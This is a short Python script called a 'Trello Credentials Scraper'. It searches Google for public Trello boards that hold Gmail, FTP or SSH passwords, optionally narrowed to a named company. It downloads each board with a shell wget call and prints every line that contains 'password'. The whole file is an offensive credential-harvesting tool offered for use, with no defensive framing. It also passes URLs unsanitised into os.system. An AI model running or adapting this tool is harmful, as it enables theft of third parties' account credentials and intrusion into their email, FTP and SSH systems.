from googlesearch import search
from argparse import ArgumentParser
import os

parser = ArgumentParser(description='Trello Credentials Scraper')

parser.add_argument('-l', '--limit', type=int, metavar='',required=True, help='Limit the number of search')
parser.add_argument('-s', '--sleep_time', type=int, metavar='', required=True, help='Sleep time between requests')
parser.add_argument('-C', '--company', type=str, metavar='', help='OPTIONAL: Search for a specific company board')
parser.add_argument('-T', '--typeof_credential', type=str, metavar='', help='OPTIONAL: Search for a specific credential, it might be FTP, SSH or GMAIL accounts (DEFAULT IS FOR GMAIL) ej: -T SSH or -T FTP')

args = parser.parse_args()

results = []
query = 'intext:@gmail.com AND intext:password'

if args.typeof_credential:
	if args.typeof_credential == 'FTP':
        	query = 'intext:FTP AND intext:password'
	if args.typeof_credential == 'SSH':
        	query = 'intext:SSH AND intext:password'

if args.company:
        query = query + ' AND intext:%s OR intitle:%s' % (args.company, args.company)

for i in search(query, lang = 'en', num=10, start=0, stop=args.limit, pause=float(args.sleep_time),domains=['trello.com']):
	results.append(i)
	print('\033[91m Downloading actual url, and getting passwords: %s' % (i))
	download = 'wget "%s" -q -O tmpfile' % (i)
	os.system(download)
	with open('tmpfile', 'r') as f:
    		for line in f.readlines():
			if 'password' in line:
				print('\033[93m %s' % (line))
